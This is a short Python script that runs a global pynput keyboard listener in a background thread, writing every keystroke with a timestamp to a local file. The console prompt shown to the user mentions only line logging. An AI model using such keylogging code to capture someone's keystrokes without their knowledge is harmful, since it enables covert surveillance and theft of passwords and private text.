from pynput import keyboard
from datetime import datetime
import threading

def char_logger():
    log_file = "char_log.txt"

    def on_press(key):
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            char = key.char
        except AttributeError:
            char = str(key)

        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{time_str} - {char}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def line_logger():
    log_file = "line_log.txt"
    print("Type your text and press ENTER to log it. Type 'EXIT' to stop.")

    while True:
        text = input("> ")
        if text.upper() == "EXIT":
            print("Logger stopped.")
            break

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {text}\n")

        print("Logged successfully.\n")

t1 = threading.Thread(target=char_logger, daemon=True)
t1.start()

line_logger()
